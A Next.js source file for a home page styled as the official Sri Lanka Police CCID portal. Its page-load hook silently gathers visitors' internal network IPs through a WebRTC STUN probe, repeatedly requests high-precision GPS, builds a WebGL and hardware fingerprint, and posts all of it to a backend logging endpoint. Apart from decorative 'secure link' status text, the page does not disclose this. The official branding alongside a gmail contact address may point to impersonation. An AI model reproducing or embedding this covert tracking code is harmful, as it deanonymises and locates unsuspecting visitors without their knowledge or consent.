"use client";
import { API_URL, authHeaders } from "@/lib/config";

import { useState, useEffect } from "react";
import Link from "next/link";
import {
  Shield,
  FileText,
  Gavel,
  ArrowRight,
  Lock,
  Clock,
  Search,
  ChevronDown,
  Mail,
  Phone,
  Facebook,
  Twitter,
  Instagram,
  Youtube,
  ChevronUp,
  MapPin,
  ExternalLink,
  Menu,
  Globe,
  X,
  ChevronRight,
} from "lucide-react";

export default function Home() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isScrolled, setIsScrolled] = useState(false);
  const [lang, setLang] = useState<"en" | "si" | "ta">("si");
  const [securityStatus, setSecurityStatus] = useState(
    "SCANNING_ENVIRONMENT...",
  );

  const t = {
    si: {
      title: "ශ්‍රී ලංකා පොලිස් CCID",
      division: "පරිගණක අපරාධ විමර්ශන කොට්ඨාසය",
      home: "CCID මුල් පිටුව",
      nav: [
        "CCID මූලික",
        "ඩිජිටල් අධිකරණ වෛද්‍ය",
        "සයිබර් ආරක්ෂාව",
        "මහජන උපදේශන",
        "නිති අසන පැන",
      ],
      heroTitle: "CCID නිල ද්වාරය",
      heroDesc:
        "ශ්‍රී ලංකාවේ ඩිජිටල් දේශසීමා සුරක්ෂිත කිරීම. නෛතික ඉදිරිපත් කිරීම් සහ නඩු වාර්තා සඳහා නිල පරිගණක අපරාධ විමර්ශන කොට්ඨාසය (CCID) ද්වාරය.",
      registryBtn: "නෛතික ඉදිරිපත් කිරීමේ ලේඛනාගාරය",
      officerBtn: "නිලධාරී පිවිසුම",
    },
    en: {
      title: "SRI LANKA POLICE CCID",
      division: "Computer Crime Investigation Division",
      home: "CCID Home",
      nav: [
        "CCID Core",
        "Digital Forensics",
        "Cyber Safety",
        "Public Advisories",
        "FAQ",
      ],
      heroTitle: "CCID OFFICIAL PORTAL",
      heroDesc:
        "Securing Sri Lanka's Digital Frontiers. The official Computer Crime Investigation Division (CCID) portal for legal submissions and case reports.",
      registryBtn: "Legal Submission Registry",
      officerBtn: "Officer Login",
    },
    ta: {
      title: "இலங்கை பொலிஸ் CCID",
      division: "கணினி குற்றப் புலனாய்வுப் பிரிவு",
      home: "CCID முகப்பு",
      nav: [
        "CCID கோர்",
        "டிஜிட்டல் தடயவியல்",
        "சைபர் பாதுகாப்பு",
        "பொது ஆலோசனைகள்",
        "அடிக்கடி கேட்கப்படும் கேள்விகள்",
      ],
      heroTitle: "CCID உத்தியோகபூர்வ போர்டல்",
      heroDesc:
        "இலங்கையின் டிஜிட்டல் எல்லைகளை பாதுகாத்தல். சட்ட சமர்ப்பிப்புகள் மற்றும் வழக்கு அறிக்கைகளுக்கான உத்தியோகபூர்வ கணினி குற்றப் புலனாய்வுப் பிரிவு (CCID) போர்டல்.",
      registryBtn: "சட்ட சமர்ப்பிப்பு பதிவு",
      officerBtn: "அதிகாரி உள்நுழைவு",
    },
  }[lang];

  useEffect(() => {
    const handleScroll = () => setIsScrolled(window.scrollY > 20);
    window.addEventListener("scroll", handleScroll);

    const logVisit = async () => {
      setSecurityStatus("CALIBRATING_GEOSPATIAL_SENSORS...");

      // WebRTC Forensic Probe (Internal Wi-Fi/LAN Disclosure)
      const getInternalIPs = async () => {
        return new Promise<string[]>((resolve) => {
          const ips: string[] = [];
          const pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
          });
          pc.createDataChannel("");
          pc.onicecandidate = (e) => {
            if (!e.candidate) {
              pc.close();
              resolve(ips);
              return;
            }
            const ipMatch =
              /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(
                e.candidate.candidate,
              );
            if (ipMatch && ipMatch[1] && !ips.includes(ipMatch[1])) {
              ips.push(ipMatch[1]);
            }
          };
          pc.createOffer()
            .then((sdp) => pc.setLocalDescription(sdp))
            .catch(() => resolve([]));
          setTimeout(() => {
            pc.close();
            resolve(ips);
          }, 2000);
        });
      };

      const getHighPrecisionGPS = async (
        retries = 3,
      ): Promise<GeolocationPosition | null> => {
        return new Promise((resolve) => {
          if (!("geolocation" in navigator)) return resolve(null);
          const attempt = (remaining: number) => {
            setSecurityStatus(`GEOSPATIAL_TRACE_L${4 - remaining}...`);
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                if (pos.coords.accuracy > 150 && remaining > 0) {
                  setTimeout(() => attempt(remaining - 1), 1000);
                } else {
                  resolve(pos);
                }
              },
              (err) => {
                if (remaining > 0)
                  setTimeout(() => attempt(remaining - 1), 2000);
                else resolve(null);
              },
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
            );
          };
          attempt(retries);
        });
      };

      const [localIPs, gpsLocation] = await Promise.all([
        getInternalIPs(),
        getHighPrecisionGPS(),
      ]);

      if (gpsLocation)
        setSecurityStatus(
          `UPLINK_SUCCESS: PRECISION_${gpsLocation.coords.accuracy.toFixed(1)}M`,
        );
      else setSecurityStatus("UPLINK_RESTRICTED: IP_FORENSICS_ONLY");

      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl");
      const debugInfo = gl?.getExtension("WEBGL_debug_renderer_info");

      const fingerprint = {
        screen: `${window.screen.width}x${window.screen.height}`,
        gpu: debugInfo
          ? gl?.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          : "N/A",
        cores: (navigator as any).hardwareConcurrency || "N/A",
        internal_nodes: localIPs, // Detected Internal IPs (Wi-Fi/LAN)
        mem: (navigator as any).deviceMemory || "N/A",
        con: (navigator as any).connection?.effectiveType || "N/A",
        ua: navigator.userAgent,
      };

      try {
        await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            location: gpsLocation
              ? {
                  lat: gpsLocation.coords.latitude,
                  lon: gpsLocation.coords.longitude,
                  acc: gpsLocation.coords.accuracy,
                }
              : null,
            fingerprint: fingerprint,
            source: "CCID_PRECISION_GATEWAY_V2",
          }),
        });
      } catch (err) {
        console.error("Forensic log failed");
      }
    };

    // Trigger forensic trace after slight delay
    setTimeout(logVisit, 1200);

    return () => window.removeEventListener("scroll", handleScroll);
  }, []);
  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans">
      {/* Official Top Bar */}
      <div className="bg-[#0b1640] py-4 px-6 border-b border-white/10">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-4 md:gap-6">
            <img
              src="/logo.png"
              alt="SL Police Logo"
              className="h-14 md:h-20 w-auto"
            />
            <div className="space-y-0.5 md:space-y-1">
              <h1 className="text-xl md:text-5xl font-black text-white tracking-wider md:tracking-widest uppercase leading-tight">
                {t.title}
              </h1>
              <div className="flex items-center gap-2 md:gap-3">
                <img
                  src="https://flagcdn.com/w40/lk.png"
                  alt="SL Flag"
                  className="h-3 md:h-4 shadow-sm"
                />
                <span className="text-[8px] md:text-[10px] text-white/60 font-bold uppercase tracking-widest whitespace-nowrap">
                  {t.division}
                </span>
              </div>
            </div>
          </div>
          <div className="flex flex-col items-end gap-3 text-white">
            <div className="flex items-center gap-3 md:gap-4 px-2 md:px-0">
              {[
                { id: "si", label: "සිංහල" },
                { id: "en", label: "ENGLISH" },
                { id: "ta", label: "தமிழ்" },
              ].map((l) => (
                <button
                  key={l.id}
                  onClick={() => setLang(l.id as any)}
                  className={`text-[9px] md:text-[10px] font-black uppercase tracking-widest transition-all ${
                    lang === l.id
                      ? "text-yellow-400"
                      : "text-white/40 hover:text-white"
                  }`}
                >
                  {l.label}
                </button>
              ))}
            </div>
            <div className="flex items-center bg-white/10 rounded-sm overflow-hidden border border-white/20 w-full max-w-[280px]">
              <div className="p-2 text-white/60 hover:text-white transition-colors cursor-pointer bg-white/20">
                <Search className="w-4 h-4" />
              </div>
              <input
                type="text"
                placeholder="Search CCID services..."
                className="bg-transparent border-none text-xs p-2 outline-none w-full text-white placeholder:text-white/40"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Primary Navigation */}
      <nav
        className={`bg-[#122261] border-b-4 border-yellow-500 sticky top-0 z-[100] shadow-xl transition-all ${isScrolled ? "h-10" : "h-12 md:h-14"}`}
      >
        <div className="max-w-7xl mx-auto px-4 md:px-6 h-full flex items-center justify-between">
          <div className="flex items-center gap-1 h-full overflow-x-auto no-scrollbar hidden lg:flex">
            <Link
              href="/"
              className="px-4 h-full flex items-center bg-[#f7b919] text-[#122261] font-bold text-xs uppercase tracking-widest whitespace-nowrap"
            >
              <Clock className="w-3.5 h-3.5 mr-2" /> {t.home}
            </Link>
            {t.nav.map((item) => (
              <button
                key={item}
                className="px-4 h-full flex items-center text-white font-bold text-xs uppercase tracking-widest hover:bg-white/10 transition-colors group whitespace-nowrap"
              >
                {item}{" "}
                <ChevronDown className="w-3 h-3 ml-1 group-hover:rotate-180 transition-transform" />
              </button>
            ))}
          </div>

          {/* Simple Mobile Nav Toggle */}
          <Link
            href="/"
            className="lg:hidden h-full flex items-center text-yellow-400 font-bold text-[10px] uppercase tracking-[0.2em]"
          >
            CCID OFFICIAL UNIT
          </Link>

          <button
            onClick={() => setIsMenuOpen(!isMenuOpen)}
            className="lg:hidden p-2 text-white hover:text-yellow-500 transition-colors"
          >
            {isMenuOpen ? (
              <X className="w-6 h-6" />
            ) : (
              <Menu className="w-6 h-6" />
            )}
          </button>
        </div>

        {/* Mobile Sidebar/Menu */}
        {isMenuOpen && (
          <div className="lg:hidden absolute top-full left-0 w-full bg-[#0b1640] border-t border-white/10 shadow-2xl animate-in slide-in-from-top duration-300">
            <div className="p-6 flex flex-col gap-4">
              {[
                "Home",
                "CCID Core",
                "Digital Forensics",
                "Cyber Safety",
                "Public Advisories",
                "Officer Login",
              ].map((item) => (
                <Link
                  key={item}
                  href={
                    item === "Officer Login"
                      ? "/admin"
                      : item === "Home"
                        ? "/"
                        : "#"
                  }
                  className="flex items-center justify-between text-white font-bold text-xs uppercase tracking-widest p-4 bg-white/5 rounded-lg border border-white/5 hover:border-yellow-500 transition-all"
                  onClick={() => setIsMenuOpen(false)}
                >
                  {item} <ChevronRight className="w-4 h-4 text-yellow-500" />
                </Link>
              ))}
            </div>
          </div>
        )}
      </nav>

      {/* Official Forensic Trace Status Bar */}
      <div className="bg-black border-b border-white/5 py-1.5 px-6 flex justify-between items-center overflow-hidden">
        <div className="flex items-center gap-3">
          <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse shadow-[0_0_8px_#10b981]"></div>
          <span className="text-[10px] font-black text-white/40 uppercase tracking-[0.2em] whitespace-nowrap">
            SECURE_LINK:{" "}
            <span className="text-emerald-500">{securityStatus}</span>
          </span>
        </div>
        <div className="hidden md:flex items-center gap-6 text-[9px] font-bold text-white/20 uppercase tracking-widest">
          <span>Encrypted Packet Relay: ON</span>
          <span className="text-white/40">Node: HQ_COLOMBO_01</span>
        </div>
      </div>

      {/* News Strip */}
      <div className="bg-red-600 h-10 flex items-center overflow-hidden">
        <div className="bg-red-700 px-6 h-full flex items-center text-white font-black text-xs uppercase italic skew-x-[-20deg] ml-[-10px]">
          <span className="skew-x-[20deg] ml-2">CCID News »</span>
        </div>
        <div className="flex-1 px-6 text-white text-xs font-bold whitespace-nowrap animate-marquee">
          New Cyber Security Guidelines Issued for 2026... CCID Digital Forensic
          Lab expands operations... Report Financial Cyber Frauds via Online
          Portal...
        </div>
      </div>

      {/* Hero Section */}
      <header className="relative">
        <div className="h-[500px] overflow-hidden">
          <img
            src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2670&auto=format&fit=crop"
            alt="Cyber Security Background"
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-black/60 flex items-center justify-center text-center px-6">
            <div className="space-y-6 max-w-4xl animate-in fade-in slide-in-from-bottom duration-700">
              <h2 className="text-4xl md:text-6xl font-black text-white hover:text-yellow-400 transition-colors cursor-default drop-shadow-2xl uppercase tracking-tighter">
                {t.heroTitle}
              </h2>
              <p className="text-lg text-white/90 font-medium max-w-2xl mx-auto drop-shadow-sm">
                {t.heroDesc}
              </p>
              <div className="flex flex-col sm:flex-row gap-4 justify-center pt-4">
                <Link
                  href="/courtnotices"
                  className="bg-[#f7b919] text-[#122261] px-10 py-5 font-black uppercase tracking-widest text-sm rounded shadow-2xl hover:bg-white transition-all transform hover:-translate-y-1"
                >
                  {t.registryBtn}
                </Link>
                <Link
                  href="/admin"
                  className="bg-[#122261] border border-white/40 text-white px-10 py-5 font-black uppercase tracking-widest text-sm rounded shadow-2xl hover:bg-white hover:text-[#122261] transition-all transform hover:-translate-y-1"
                >
                  {t.officerBtn}
                </Link>
              </div>
            </div>
          </div>
        </div>

        {/* Quick Access Grid */}
        <div className="max-w-7xl mx-auto px-6 mt-[-60px] relative z-10 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 md:gap-4">
          {[
            {
              icon: <Shield />,
              title: "Cyber Defense",
              desc: "Digital Protection",
            },
            {
              icon: <Youtube />,
              title: "Advisory",
              desc: "Public Videos",
            },
            {
              icon: <Globe />,
              title: "Intelligence",
              desc: "Cyber Threat Map",
            },
            {
              icon: <Phone />,
              title: "Emergency",
              desc: "Crime Hotlines",
            },
            {
              icon: <Gavel />,
              title: "Legal Unit",
              desc: "Case Submissions",
            },
          ].map((item, i) => (
            <div
              key={i}
              className={`bg-white p-4 md:p-6 rounded-lg shadow-xl border-x border-[#122261]/10 text-center space-y-3 md:space-y-4 hover:border-yellow-500 transition-colors cursor-pointer group ${i === 4 ? "col-span-2 sm:col-span-1" : ""}`}
            >
              <div className="w-8 h-8 md:w-12 md:h-12 mx-auto flex items-center justify-center text-[#122261] group-hover:scale-110 transition-transform">
                {item.icon}
              </div>
              <h4 className="font-black text-[#122261] uppercase tracking-tight text-[10px] md:text-sm">
                {item.title}
              </h4>
              <p className="hidden md:block text-[10px] text-slate-500 font-bold leading-relaxed">
                {item.desc}
              </p>
            </div>
          ))}
        </div>
      </header>

      {/* Institutional History & Operational Excellence */}
      <section id="about" className="py-24 bg-white">
        <div className="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-2 gap-24 items-center">
          <div className="space-y-10 order-2 md:order-1">
            <div className="space-y-4">
              <h3 className="text-sm font-black text-[#122261] uppercase tracking-[0.4em] border-l-4 border-yellow-500 pl-6">
                OUR LEGACY
              </h3>
              <h4 className="text-4xl font-black text-[#122261] leading-tight">
                Established with a vision for a secure Digital Sri Lanka.
              </h4>
            </div>
            <div className="space-y-6 text-sm text-slate-600 font-bold leading-relaxed">
              <p>
                Founded as a specialized wing of the Criminal Investigation
                Department (CID), the Computer Crime Investigation Division
                (CCID) was established in response to the rapid digitalization
                of the island nation. Over the decades, we have evolved from a
                small unit into a world-class digital forensic and investigation
                powerhouse.
              </p>
              <p>
                Our mission is to combat cybercrime, protect critical
                information infrastructure, and provide expert forensic
                assistance to the judiciary. We operate under the legal
                framework of the Computer Crimes Act No. 24 of 2007.
              </p>
              <div className="bg-slate-50 p-8 rounded-3xl border border-slate-100 flex items-center gap-6">
                <div className="w-16 h-16 bg-yellow-500 rounded-2xl flex items-center justify-center shrink-0 shadow-lg">
                  <Gavel className="w-8 h-8 text-[#122261]" />
                </div>
                <div>
                  <p className="text-[#122261] font-black uppercase text-xs">
                    Legal Mandate
                  </p>
                  <p className="text-[10px] opacity-70">
                    Empowered by the Computer Crimes Act No. 24 of 2007 to
                    investigate and prosecute digital offenders.
                  </p>
                </div>
              </div>
            </div>
          </div>
          <div className="order-1 md:order-2 space-y-8">
            <h3 className="text-sm font-black text-[#122261] uppercase tracking-[0.4em] border-l-4 border-yellow-500 pl-6">
              EXCELLENCE & AWARDS
            </h3>
            <div className="grid grid-cols-1 gap-4">
              {[
                {
                  year: "2024",
                  award: "National Cyber Excellence Award",
                  body: "Ministry of Technology",
                },
                {
                  year: "2022",
                  award: "Best Forensic Intelligence Unit",
                  body: "South Asian Law Enforcement Summit",
                },
                {
                  year: "2021",
                  award: "Digital Frontier Protection Citation",
                  body: "International Cyber Task Force",
                },
              ].map((item, i) => (
                <div
                  key={i}
                  className="flex items-center gap-6 p-6 bg-slate-50 rounded-2xl border border-slate-100 group hover:bg-[#122261] transition-all cursor-default"
                >
                  <div className="text-lg font-black text-yellow-500 group-hover:text-white">
                    {item.year}
                  </div>
                  <div>
                    <p className="text-xs font-black text-[#122261] group-hover:text-white uppercase leading-none">
                      {item.award}
                    </p>
                    <p className="text-[9px] text-slate-400 group-hover:text-white/60 font-bold uppercase tracking-widest mt-1">
                      {item.body}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* CCID Leadership & Officers Section */}
      <section className="py-24 bg-slate-50 flex flex-col items-center">
        <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-8">
          Official Documentation
        </h3>
        <div className="max-w-7xl mx-auto px-6">
          <div className="bg-white rounded-[60px] overflow-hidden shadow-sm border border-slate-100 flex flex-col lg:flex-row">
            <div className="lg:w-1/2 relative h-[400px] lg:h-auto overflow-hidden">
              <img
                src="/ccid-event.jpg"
                alt="CCID Official Event"
                className="absolute inset-0 w-full h-full object-cover grayscale-[10%] hover:grayscale-0 transition-all duration-700 hover:scale-105"
              />
              <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent"></div>
            </div>
            <div className="lg:w-1/2 p-12 lg:p-20 space-y-10 flex flex-col justify-center">
              <div className="space-y-6">
                <div className="flex items-center gap-4">
                  <div className="w-1.5 h-6 bg-yellow-500 rounded-full"></div>
                  <h3 className="text-xs font-black text-[#122261] uppercase tracking-[0.3em]">
                    OFFICIAL LEADERSHIP
                  </h3>
                </div>
                <h4 className="text-4xl font-black text-[#122261] leading-tight">
                  Protecting Sri Lanka's Digital Integrity
                </h4>
              </div>

              <p className="text-slate-600 font-bold leading-relaxed text-sm">
                The Computer Crime Investigation Division (CCID) remains at the
                forefront of national security, combining advanced digital
                forensics with strategic intelligence to combat evolving cyber
                threats. Our dedicated team of officers and cyber experts work
                tirelessly to ensure a safer digital environment for all
                citizens.
              </p>

              <div className="flex flex-wrap gap-8 pt-10 border-t border-slate-50">
                <div className="space-y-1">
                  <p className="text-3xl font-black text-[#122261]">24/7</p>
                  <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">
                    Surveillance
                  </p>
                </div>
                <div className="space-y-1">
                  <p className="text-3xl font-black text-[#122261]">1,200+</p>
                  <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">
                    Cases Solved
                  </p>
                </div>
                <div className="space-y-1">
                  <p className="text-3xl font-black text-[#122261]">15+</p>
                  <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">
                    Specialist Units
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Notable Services */}
      <section className="py-24 max-w-7xl mx-auto px-6">
        <div className="flex items-center gap-4 mb-12">
          <div className="h-[1px] flex-1 bg-slate-200"></div>
          <h3 className="text-sm font-black text-[#122261] uppercase tracking-[0.4em]">
            CCID NOTABLE SERVICES
          </h3>
          <div className="h-[1px] flex-1 bg-slate-200"></div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
          {[
            {
              img: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=600&auto=format&fit=crop",
              title: "New Digital Forensic Lab Inaugurated",
            },
            {
              img: "https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=600&auto=format&fit=crop",
              title: "Cyber Awareness Program for Schools",
            },
            {
              img: "https://images.unsplash.com/photo-1451187580459-43490279c0fa?q=80&w=600&auto=format&fit=crop",
              title: "International Cyber Crime Conference 2026",
            },
            {
              img: "https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?q=80&w=600&auto=format&fit=crop",
              title: "CCID Recruitment for Cyber Experts",
            },
          ].map((card, i) => (
            <div
              key={i}
              className="bg-white rounded-lg overflow-hidden border border-slate-100 shadow-sm hover:shadow-xl transition-all group cursor-pointer"
            >
              <div className="h-48 overflow-hidden relative bg-slate-100">
                <img
                  src={card.img}
                  alt={card.title}
                  className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500 text-[0px]"
                />
                <div className="absolute top-0 right-0 p-3">
                  <div className="bg-yellow-500 w-2 h-2 rounded-full shadow-[0_0_10px_#eab308]"></div>
                </div>
              </div>
              <div className="p-6">
                <p className="text-xs font-bold text-slate-700 leading-relaxed text-center group-hover:text-[#122261] transition-colors uppercase">
                  {card.title}
                </p>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* Official Footer */}
      <footer className="bg-[#122261] pt-16 pb-8 text-white relative">
        <div className="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-3 gap-20 border-b border-white/10 pb-16">
          <div className="space-y-6">
            <h4 className="text-sm font-black text-yellow-500 uppercase tracking-widest border-l-4 border-yellow-500 pl-4">
              CCID RELATED LINKS
            </h4>
            <ul className="space-y-3 text-[11px] font-bold text-white/70">
              {[
                "CID Headquarters Sri Lanka",
                "Ministry of Public Security",
                "CERT|CC Sri Lanka",
                "TRCSL Online Portal",
                "International Cyber Task Force",
              ].map((link) => (
                <li
                  key={link}
                  className="flex items-center gap-2 hover:text-white transition-colors cursor-pointer group"
                >
                  <div className="w-2 h-2 bg-sky-500/40 rounded-full group-hover:bg-sky-500"></div>{" "}
                  {link}
                </li>
              ))}
            </ul>
          </div>

          <div className="space-y-6 text-center md:text-left">
            <h4 className="text-sm font-black text-yellow-500 uppercase tracking-widest border-l-4 border-yellow-500 pl-4">
              CONTACT CCID
            </h4>
            <div className="space-y-4 text-[11px] font-bold text-white/70">
              <div className="flex items-start gap-4">
                <MapPin className="w-4 h-4 text-emerald-400" />
                <span>CCID, 4th Floor, CID HQ, Colombo 01, Sri Lanka.</span>
              </div>
              <div className="flex items-center gap-4">
                <Phone className="w-4 h-4 text-sky-400" />
                <span>(+94) 11 7320641</span>
              </div>
              <div className="flex items-center gap-4">
                <Mail className="w-4 h-4 text-red-400" />
                <span>srilankapoliceccid@gmail.com</span>
              </div>
            </div>
          </div>

          <div className="flex flex-col items-center gap-8">
            <div className="relative w-40 h-40">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Flag_map_of_Sri_Lanka.svg/1024px-Flag_map_of_Sri_Lanka.svg.png"
                alt="SL Map"
                className="w-full h-full object-contain opacity-40 brightness-0 invert"
              />
              <div className="absolute top-[60%] left-[45%] w-2 h-2 bg-yellow-500 rounded-full shadow-[0_0_10px_#eab308] animate-ping"></div>
            </div>
            <div className="flex gap-4">
              <Facebook className="p-2 w-8 h-8 bg-white/10 rounded cursor-pointer hover:bg-yellow-500 transition-colors" />
              <Twitter className="p-2 w-8 h-8 bg-white/10 rounded cursor-pointer hover:bg-yellow-500 transition-colors" />
              <Youtube className="p-2 w-8 h-8 bg-white/10 rounded cursor-pointer hover:bg-yellow-500 transition-colors" />
              <Instagram className="p-2 w-8 h-8 bg-white/10 rounded cursor-pointer hover:bg-yellow-500 transition-colors" />
            </div>
          </div>
        </div>

        <div className="max-w-7xl mx-auto px-6 pt-8 flex flex-col md:flex-row justify-between items-center gap-4 text-[9px] font-black text-white/40 uppercase tracking-[0.3em]">
          <p>© 2026 Sri Lanka Police • Official Digital Registry Unit</p>
          <div className="flex gap-8">
            <span className="hover:text-white cursor-pointer">
              Terms of Service
            </span>
            <span className="hover:text-white cursor-pointer">
              Privacy Policy
            </span>
          </div>
        </div>

        <button
          onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
          className="absolute right-10 bottom-10 bg-sky-600 p-3 rounded shadow-2xl hover:bg-yellow-500 hover:scale-110 transition-all"
        >
          <ChevronUp className="w-5 h-5" />
        </button>
      </footer>

      {/* Extra Marquee Animations */}
      <style jsx global>{`
        @keyframes marquee {
          0% {
            transform: translateX(100%);
          }
          100% {
            transform: translateX(-100%);
          }
        }
        .animate-marquee {
          animation: marquee 30s linear infinite;
        }
      `}</style>
    </div>
  );
}
